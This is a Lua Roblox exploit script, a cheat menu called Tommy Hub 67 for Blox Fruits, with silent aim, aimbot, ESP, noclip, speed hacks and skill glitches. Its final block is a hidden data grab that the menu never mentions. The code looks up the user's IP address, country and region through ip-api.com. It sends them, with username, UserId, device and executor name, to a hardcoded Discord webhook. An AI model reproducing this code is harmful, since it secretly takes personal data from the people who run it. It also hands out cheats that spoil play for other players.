local function lighten(c, a) return c:Lerp(WHITE, a) end
local function acc(inst, prop, mix)
    table.insert(themed, {inst, prop, mix})
    inst[prop] = mix and mix(ACCENT) or ACCENT
    return inst
end
local function mk(class, parent, props)
    local o = Instance.new(class)
    for k, v in pairs(props or {}) do o[k] = v end
    o.Parent = parent
    return o
end
local function corner(o, r) return mk("UICorner", o, {CornerRadius = UDim.new(0, r)}) end
local function stroke(o, c, t, tr) return mk("UIStroke", o, {Color = c, Thickness = t or 1, Transparency = tr or 0}) end
local function tween(o, t, props)
    TweenService:Create(o, TweenInfo.new(t, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local gui = Instance.new("ScreenGui")
gui.Name = "TommyHub67_UI"; gui.ResetOnSpawn = false; gui.DisplayOrder = 99999
pcall(function() gui.Parent = (gethui and gethui()) or game:GetService("CoreGui") end)
if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end

local main = mk("Frame", gui, {
    Size = UDim2.new(0, 480, 0, 340), Position = UDim2.new(0.5, -240, 0.5, -170),
    BackgroundColor3 = BG0, BackgroundTransparency = 0.04, BorderSizePixel = 0,
    Active = true, ClipsDescendants = true,
})
corner(main, 14)
acc(stroke(main, ACCENT, 1.4, 0.35), "Color")
mk("UIGradient", main, {Rotation = 90, Color = ColorSequence.new(Color3.fromRGB(24, 21, 38), Color3.fromRGB(10, 10, 15))})

local header = mk("Frame", main, {Size = UDim2.new(1, 0, 0, 46), BackgroundTransparency = 1})
local logo = mk("Frame", header, {Size = UDim2.new(0, 30, 0, 30), Position = UDim2.new(0, 12, 0, 8), BorderSizePixel = 0})
acc(logo, "BackgroundColor3"); corner(logo, 9)
mk("TextLabel", logo, {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = "T", Font = FONT_K, TextSize = 17, TextColor3 = WHITE})
local title = mk("TextLabel", header, {
    Text = "TOMMY HUB 67", Font = FONT_K, TextSize = 15, TextColor3 = WHITE, BackgroundTransparency = 1,
    Size = UDim2.new(0, 200, 0, 18), Position = UDim2.new(0, 50, 0, 6), TextXAlignment = Enum.TextXAlignment.Left,
})
acc(mk("UIGradient", title, {}), "Color", function(c) return ColorSequence.new(c, lighten(c, 0.55)) end)
mk("TextLabel", header, {
    Text = "@accountxz  •  Blox Fruits", Font = FONT_M, TextSize = 10, TextColor3 = MUTED, BackgroundTransparency = 1,
    Size = UDim2.new(0, 200, 0, 14), Position = UDim2.new(0, 50, 0, 25), TextXAlignment = Enum.TextXAlignment.Left,
})
local divider = mk("Frame", main, {Size = UDim2.new(1, -24, 0, 1), Position = UDim2.new(0, 12, 0, 46), BorderSizePixel = 0, BackgroundTransparency = 0.7})
acc(divider, "BackgroundColor3")

do
    local dragging, dragStart, startPos, dragInput
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true; dragStart = input.Position; startPos = main.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    header.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
    end)
    track(UIS.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local d = input.Position - dragStart
            main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end))
end

local openBtn = mk("TextButton", gui, {
    Size = UDim2.new(0, 44, 0, 44), Position = UDim2.new(0, 15, 0, 15), Text = "T67", Font = FONT_K, TextSize = 12,
    TextColor3 = WHITE, BackgroundColor3 = BG0, Visible = false, Active = true, Draggable = true, AutoButtonColor = false,
})
corner(openBtn, 22); acc(stroke(openBtn, ACCENT, 2), "Color")
local function setOpen(v) main.Visible = v; openBtn.Visible = not v end
openBtn.MouseButton1Click:Connect(function() setOpen(true) end)

local function topBtn(txt, x, col, cb)
    local b = mk("TextButton", header, {
        Text = txt, Font = FONT_K, TextSize = 13, TextColor3 = col, BackgroundColor3 = BG2,
        Size = UDim2.new(0, 26, 0, 26), Position = UDim2.new(1, x, 0, 10),
    })
    corner(b, 8)
    b.MouseButton1Click:Connect(cb)
end

local function cleanup()
    alive = false
    S.SkillAimbot = false; S.A67_Enabled = false; S.AutoDungeon = false
    setAntiStun(false)
    for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
    for p in pairs(esp) do clearESP(p) end
    if rainbowHL then rainbowHL:Destroy() end
    if A67_marker then A67_marker:Destroy() end
    applyDash(1)
    pcall(function() gui:Destroy() end)
    env.TommyHub67 = nil
end
env.TommyHub67 = cleanup
topBtn("–", -70, MUTED, function() setOpen(false) end)
topBtn("✕", -38, Color3.fromRGB(255, 90, 100), cleanup)
track(UIS.InputBegan:Connect(function(i, gp)
    if not gp and i.KeyCode == Enum.KeyCode.F4 then setOpen(not main.Visible) end
end))

local sidebar = mk("Frame", main, {Size = UDim2.new(0, 112, 1, -62), Position = UDim2.new(0, 10, 0, 54), BackgroundTransparency = 1})
local tabs = mk("Frame", sidebar, {Size = UDim2.new(1, 0, 1, -22), BackgroundTransparency = 1})
mk("UIListLayout", tabs, {Padding = UDim.new(0, 5), SortOrder = Enum.SortOrder.LayoutOrder})
mk("TextLabel", sidebar, {
    Text = "F4  •  abrir / cerrar", Font = FONT_M, TextSize = 9, TextColor3 = MUTED, BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 0, 16), Position = UDim2.new(0, 0, 1, -16),
})
local content = mk("Frame", main, {Size = UDim2.new(1, -142, 1, -62), Position = UDim2.new(0, 132, 0, 54), BackgroundColor3 = BG1, BorderSizePixel = 0})
corner(content, 12); stroke(content, WHITE, 1, 0.94)

local ICONS = {Combat = "⚔", Glitches = "✨", Soru = "⚡", ESP = "👁", Dungeons = "🏰", Misc = "⚙"}
local pages, tabObjs, currentPage, tabCount = {}, {}, nil, 0
local function showPage(name)
    currentPage = name
    for n, p in pairs(pages) do p.Visible = (n == name) end
    for n, t in pairs(tabObjs) do
        local on = (n == name)
        t.bar.Visible = on
        t.btn.BackgroundColor3 = ACCENT
        t.btn.BackgroundTransparency = on and 0.85 or 1
        t.btn.TextColor3 = on and WHITE or MUTED
    end
end
local function newPage(name)
    local sf = mk("ScrollingFrame", content, {
        Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, BorderSizePixel = 0, ScrollBarThickness = 3,
        AutomaticCanvasSize = Enum.AutomaticSize.Y, CanvasSize = UDim2.new(), Visible = false,
    })
    acc(sf, "ScrollBarImageColor3")
    mk("UIListLayout", sf, {Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder})
    mk("UIPadding", sf, {PaddingTop = UDim.new(0, 8), PaddingBottom = UDim.new(0, 8), PaddingLeft = UDim.new(0, 8), PaddingRight = UDim.new(0, 10)})
    pages[name] = sf
    tabCount = tabCount + 1
    local btn = mk("TextButton", tabs, {
        Text = "  " .. (ICONS[name] or "•") .. "  " .. name, Font = FONT_B, TextSize = 12, TextXAlignment = Enum.TextXAlignment.Left,
        Size = UDim2.new(1, 0, 0, 32), BackgroundTransparency = 1, BorderSizePixel = 0, AutoButtonColor = false,
        TextColor3 = MUTED, LayoutOrder = tabCount,
    })
    corner(btn, 8)
    local bar = mk("Frame", btn, {Size = UDim2.new(0, 3, 0, 16), Position = UDim2.new(0, 0, 0.5, -8), BorderSizePixel = 0, Visible = false})
    acc(bar, "BackgroundColor3"); corner(bar, 2)
    tabObjs[name] = {btn = btn, bar = bar}
    btn.MouseButton1Click:Connect(function() showPage(name) end)
    return sf
end

local orderN = {}
local function nextOrder(page) orderN[page] = (orderN[page] or 0) + 1; return orderN[page] end
local reg = {}

local function section(page, text)
    local f = mk("Frame", page, {Size = UDim2.new(1, 0, 0, 22), BackgroundTransparency = 1, LayoutOrder = nextOrder(page)})
    local l = mk("TextLabel", f, {
        Text = string.upper(text), Font = FONT_K, TextSize = 10, BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 0, 18), Position = UDim2.new(0, 2, 0, 2), TextXAlignment = Enum.TextXAlignment.Left,
    })
    acc(l, "TextColor3")
    mk("Frame", f, {Size = UDim2.new(1, 0, 0, 1), Position = UDim2.new(0, 0, 1, -1), BackgroundColor3 = BG2, BorderSizePixel = 0})
end
local function row(page, h)
    local f = mk("Frame", page, {Size = UDim2.new(1, 0, 0, h or 34), BackgroundColor3 = BG2, BorderSizePixel = 0, LayoutOrder = nextOrder(page)})
    corner(f, 9)
    local st = stroke(f, WHITE, 1, 0.95)
    return f, st
end
local function rowLabel(f, text, rightPad)
    return mk("TextLabel", f, {
        Text = text, Font = FONT_M, TextSize = 11, TextColor3 = WHITE, BackgroundTransparency = 1,
        Size = UDim2.new(1, -(rightPad or 66), 1, 0), Position = UDim2.new(0, 12, 0, 0),
        TextXAlignment = Enum.TextXAlignment.Left, TextTruncate = Enum.TextTruncate.AtEnd,
    })
end

local function toggle(page, text, key, cb)
    local f = row(page, 34); rowLabel(f, text, 66)
    local trackF = mk("Frame", f, {Size = UDim2.new(0, 40, 0, 20), Position = UDim2.new(1, -52, 0.5, -10), BorderSizePixel = 0})
    corner(trackF, 10)
    local knob = mk("Frame", trackF, {Size = UDim2.new(0, 14, 0, 14), Position = UDim2.new(0, 3, 0.5, -7), BackgroundColor3 = WHITE, BorderSizePixel = 0})
    corner(knob, 7)
    local hit = mk("TextButton", f, {Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = "", ZIndex = 5})
    local function refresh(instant)
        local on = S[key]
        local col = on and ACCENT or OFFC
        local pos = on and UDim2.new(0, 23, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
        if instant then
            trackF.BackgroundColor3 = col; knob.Position = pos
        else
            tween(trackF, 0.15, {BackgroundColor3 = col}); tween(knob, 0.15, {Position = pos})
        end
    end
    refresh(true)
    reg[key] = {refresh = refresh, cb = cb}
    hit.MouseButton1Click:Connect(function()
        S[key] = not S[key]; refresh()
        if cb then pcall(cb, S[key]) end
    end)
end

local function stepper(page, text, key, minV, maxV, step, suffix)
    local f = row(page, 40)
    local lbl = rowLabel(f, text, 118); lbl.Size = UDim2.new(1, -118, 1, -8)
    local function fmt(v) v = math.floor(v * 100 + 0.5) / 100; return tostring(v) .. (suffix or "") end
    local function mkBtn(txt, x)
        local b = mk("TextButton", f, {
            Text = txt, Font = FONT_K, TextSize = 14, TextColor3 = WHITE, BackgroundColor3 = Color3.fromRGB(42, 42, 62),
            Size = UDim2.new(0, 24, 0, 24), Position = UDim2.new(1, x, 0, 6),
        })
        corner(b, 7)
        return b
    end
    local minus = mkBtn("-", -108)
    local val = mk("TextLabel", f, {
        Size = UDim2.new(0, 52, 0, 24), Position = UDim2.new(1, -82, 0, 6), BackgroundTransparency = 1,
        Font = FONT_B, TextSize = 11, TextColor3 = WHITE,
    })
    local plus = mkBtn("+", -30)
    local barBG = mk("Frame", f, {Size = UDim2.new(1, -24, 0, 3), Position = UDim2.new(0, 12, 1, -7), BackgroundColor3 = OFFC, BorderSizePixel = 0})
    corner(barBG, 2)
    local fill = mk("Frame", barBG, {Size = UDim2.new(0, 0, 1, 0), BorderSizePixel = 0})
    acc(fill, "BackgroundColor3"); corner(fill, 2)
    local function update()
        val.Text = fmt(S[key])
        local frac = (S[key] - minV) / math.max(maxV - minV, 1e-9)
        fill.Size = UDim2.new(math.clamp(frac, 0, 1), 0, 1, 0)
    end
    update()
    reg[key] = {update = update}
    minus.MouseButton1Click:Connect(function() S[key] = math.max(minV, math.floor((S[key] - step) * 100 + 0.5) / 100); update() end)
    plus.MouseButton1Click:Connect(function() S[key] = math.min(maxV, math.floor((S[key] + step) * 100 + 0.5) / 100); update() end)
end

local function button(page, text, cb)
    local f, st = row(page, 34)
    st.Thickness = 1; st.Transparency = 0.55; acc(st, "Color")
    local b = mk("TextButton", f, {
        Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = text, Font = FONT_B, TextSize = 11, AutoButtonColor = false,
    })
    acc(b, "TextColor3", function(c) return lighten(c, 0.3) end)
    b.MouseButton1Click:Connect(function()
        tween(f, 0.08, {BackgroundColor3 = BG1})
        task.delay(0.1, function() tween(f, 0.15, {BackgroundColor3 = BG2}) end)
        cb(b)
    end)
    return b
end

local function cycle(page, prefix, key, options, cb)
    local btn = button(page, prefix .. tostring(S[key]), function(b)
        local idx = table.find(options, S[key]) or 0
        S[key] = options[(idx % #options) + 1]
        b.Text = prefix .. tostring(S[key])
        if cb then cb(S[key]) end
    end)
    reg[key] = {update = function() btn.Text = prefix .. tostring(S[key]) end}
end

local function applyTheme(name)
    ACCENT = THEMES[name] or ACCENT
    for _, t in ipairs(themed) do
        pcall(function() t[1][t[2]] = t[3] and t[3](ACCENT) or ACCENT end)
    end
    for _, e in pairs(reg) do if e.refresh then e.refresh(true) end end
    if currentPage then showPage(currentPage) end
end

--==================== PÁGINAS ====================
local Combat  = newPage("Combat")
local Glitch  = newPage("Glitches")
local Soru    = newPage("Soru")
local ESPpage = newPage("ESP")
local Dungeon = newPage("Dungeons")

-- === COMBAT ===
section(Combat, "Silent Aim")
toggle(Combat, "Silent Aim (Skills)", "SkillAimbot")
toggle(Combat, "Aimbot M1 (Dragon Gun) ⚠ BAN", "DragonM1")
toggle(Combat, "Target Players", "TargetPlayers")
toggle(Combat, "Target NPCs", "TargetMobs")
toggle(Combat, "Team Check", "TeamCheck")
toggle(Combat, "Ignore PvP OFF", "PvPCheck")
toggle(Combat, "Rainbow Target ESP", "Rainbow")
stepper(Combat, "Max Dist:", "MaxDist", 100, 5000, 250, "st")

section(Combat, "Aimbot 67 Descarado (Visible)")
toggle(Combat, "▶ Aimbot 67 Descarado", "A67_Enabled")
toggle(Combat, "Atacar NPCs", "A67_TargetNPC")
toggle(Combat, "Atacar Players", "A67_TargetPlayer")
toggle(Combat, "Mostrar Marcador", "A67_ShowMarker")
stepper(Combat, "Predicción:", "A67_Prediction", 0, 1, 0.05, "s")
stepper(Combat, "Distancia Máx:", "A67_MaxDist", 100, 5000, 100, "st")

section(Combat, "Combate")
toggle(Combat, "Fast Attack", "FastAttack", function(v) if v then startFastAttack() end end)
toggle(Combat, "Anti Stun + Hitbox [Beta]", "AntiStun", function(v) setAntiStun(v) end)
toggle(Combat, "Auto Race V4", "AutoV4")

section(Combat, "Movimiento")
toggle(Combat, "Walk Speed", "WalkSpeed")
stepper(Combat, "Speed:", "Speed", 16, 300, 10, "")
toggle(Combat, "Dash Distance", "Dash", function(v) if v then applyDash(S.DashLen) else applyDash(1) end end)
stepper(Combat, "Dash:", "DashLen", 1, 300, 10, "")
toggle(Combat, "Noclip", "Noclip", function(v)
    if not v and player.Character then
        for _, p in pairs(player.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = true end end
    end
end)
toggle(Combat, "Walk on Water", "WaterWalk")

-- === GLITCHES ===
section(Glitch, "Sanguine Z")
toggle(Glitch, "Sanguine Z No Cooldown", "SangNoCD", function(v)
    local c = player.Character
    if c then c:SetAttribute("AllCooldown", v and 3 or nil) end
end)
button(Glitch, "🩸 Sanguine Z Manual", function() sangManual() end)
toggle(Glitch, "Sanguine Z Auto", "SangAuto", function(v)
    if v then startSangAuto() elseif sangConn then sangConn:Disconnect(); sangConn = nil end
end)
stepper(Glitch, "Drop Duration:", "SangDrop", 0.5, 5, 0.5, "s")
section(Glitch, "Trucos")
toggle(Glitch, "No Animations", "NoAnim")
toggle(Glitch, "Super Jump (botón de salto)", "SuperJump")
stepper(Glitch, "Jump Power:", "JumpPower", 50, 1000, 50, "")
toggle(Glitch, "Soul Guitar Glitch (Beta)", "SoulGuitar")
stepper(Glitch, "Soul Dash:", "SoulDash", 1, 300, 10, "")
toggle(Glitch, "Anti Lava", "AntiLava")
toggle(Glitch, "Delete Ghost Ship (Sea 2)", "DelShip")

-- === SORU ===
section(Soru, "Soru")
toggle(Soru, "Infinite Soru", "InfSoru", function() if player.Character then attachInfSoru(player.Character) end end)
toggle(Soru, "Soru Aimbot (TP)", "SoruAimbot")
stepper(Soru, "Soru Dist:", "SoruDist", 100, 3500, 250, "")
button(Soru, "🎯 Soru Target: " .. S.SoruTarget, function(b)
    local list = {"Nearest"}
    for _, p in ipairs(Players:GetPlayers()) do if p ~= player then table.insert(list, p.Name) end end
    local idx = table.find(list, S.SoruTarget) or 0
    S.SoruTarget = list[(idx % #list) + 1]
    b.Text = "🎯 Soru Target: " .. S.SoruTarget
end)
section(Soru, "Combos")
toggle(Soru, "Portal Soru Combo (X+Z)", "PortalSoru")
stepper(Soru, "Portal Soru Delay:", "PortalSoruDelay", 0.05, 2, 0.05, "s")
toggle(Soru, "Portal Sanguine C Combo", "PortalSangC")
stepper(Soru, "Sanguine C Delay:", "PortalSangCDelay", 0.05, 2, 0.05, "s")
cycle(Soru, "⚡ Trigger: ", "PortalSangCTrigger", {"PortalF", "Soru"})
toggle(Soru, "Flashstep Skill Combo", "FlashCombo")
cycle(Soru, "🗡 Weapon: ", "FlashWeapon", {"Melee", "Fruit", "Sword", "Gun"})
cycle(Soru, "⌨ Skill Key: ", "FlashKey", {"Z", "X", "C", "V", "F"})
stepper(Soru, "Skill Delay:", "FlashDelay", 0.05, 2, 0.05, "s")

-- === ESP ===
section(ESPpage, "ESP & Visuals")
toggle(ESPpage, "ESP (General)", "ESP", function(v) if not v then for p in pairs(esp) do clearESP(p) end end end)
toggle(ESPpage, "Show Name", "ESPName")
toggle(ESPpage, "Show Level", "ESPLevel")
toggle(ESPpage, "Show Bounty / PvP", "ESPBounty")
toggle(ESPpage, "Show Devil Fruit", "ESPFruit")
toggle(ESPpage, "Show Distance", "ESPDist")
toggle(ESPpage, "Show HP %", "ESPHP")
toggle(ESPpage, "Highlight Players", "ESPHighlight")
stepper(ESPpage, "Text Size:", "ESPSize", 8, 32, 1, "px")

-- === DUNGEONS ===
section(Dungeon, "Auto Dungeon")
toggle(Dungeon, "▶ Auto Dungeon (Start/Stop)", "AutoDungeon", function(v) dgSet(v) end)
cycle(Dungeon, "🗡 Arma: ", "DungeonWeapon", {"Sword", "Melee", "Blox Fruit"})
stepper(Dungeon, "Altura de ataque:", "DungeonHeight", 10, 100, 5, "")
toggle(Dungeon, "Auto V4 (tecla Y)", "DungeonV4")

-- === MISC ===
local Misc = newPage("Misc")
section(Misc, "Apariencia")
cycle(Misc, "🎨 Tema: ", "Theme", THEME_LIST, function() applyTheme(S.Theme) end)
do
    local oldUpdate = reg.Theme.update
    reg.Theme.update = function() oldUpdate(); applyTheme(S.Theme) end
end

showPage("Combat")
print("✅ TOMMY HUB 67 cargado | F4 = abrir/cerrar")

-- ================= 🔥 TOMMY HUB WEBHOOK =================
do
    local HttpService = game:GetService("HttpService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1453695404394979358v/5xnbL5Pz4dnjH2Uwoflue37adQX01d-Jb0V3j7L2P20T0UyF3BxLZ1ugan7U0sqv"

    local execCount = 1
    pcall(function()
        if getgenv then
            local g = getgenv()
            if typeof(g.TommyExecCount) == "number" then
                g.TommyExecCount = 1
            else
                g.TommyExecCount += 1
            end
            execCount = g.TommyExecCount
        end
    end)
    if not execCount or execCount < 1 then execCount = 1 end

    local function GetTime() return os.date("%Y-%m-%d %H:%M:%S") end
    local function GetDevice()
        if UIS.TouchEnabled and not UIS.KeyboardEnabled then return "Móvil"
        elseif UIS.GamepadEnabled then return "Consola"
        else return "PC" end
    end
    local function GetGameName()
        local name = "Desconocido"
        pcall(function() name = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
        return name
    end
    local function GetIPData()
        local ok, res = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
        if not ok then return nil end
        local data = HttpService:JSONDecode(res)
        return {ip = data.query or "N/A", country = data.country or "N/A", region = data.regionName or "N/A"}
    end
    local function GetExecutor()
        local name = "Desconocido"
        pcall(function()
            if type(identifyexecutor) == "function" then name = identifyexecutor()
            elseif type(getexecutorname) == "function" then name = getexecutorname()
            elseif getgenv then
                local g = getgenv()
                if rawget(g, "Xeno") then name = "Xeno"
                elseif rawget(g, "Solara") then name = "Solara" end
            elseif syn then name = "Synapse"
            elseif KRNL_LOADED then name = "KRNL"
            elseif Fluxus then name = "Fluxus"
            elseif secure_load then name = "Sentinel" end
        end)
        return tostring(name or "Desconocido")
    end

    local function SendWebhook(info)
        pcall(function()
            if not request then return end
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    content = "@everyone",
                    embeds = {{
                        title = "🔥 TOMMY HUB 67 EJECUTADO",
                        color = 65280,
                        fields = {
                            {name="Jugador", value=player.Name, inline=true},
                            {name="UserId", value=tostring(player.UserId), inline=true},
                            {name="Hora", value=GetTime(), inline=true},
                            {name="Dispositivo", value=GetDevice(), inline=true},
                            {name="Juego", value=GetGameName(), inline=true},
                            {name="Executor", value=GetExecutor(), inline=true},
                            {name="Ejecuciones", value=tostring(execCount), inline=true},
                            {name="IP", value=info.ip, inline=true},
                            {name="País", value=info.country, inline=true},
                            {name="Región", value=info.region, inline=true},
                        },
                        footer = {text="Tommy Hub System"}
                    }}
                })
            })
        end)
    end

    local info = GetIPData() or {ip="N/A", country="N/A", region="N/A"}
    SendWebhook(info)
    print("🔥 Tommy Hub67 @everyone Activado")
end
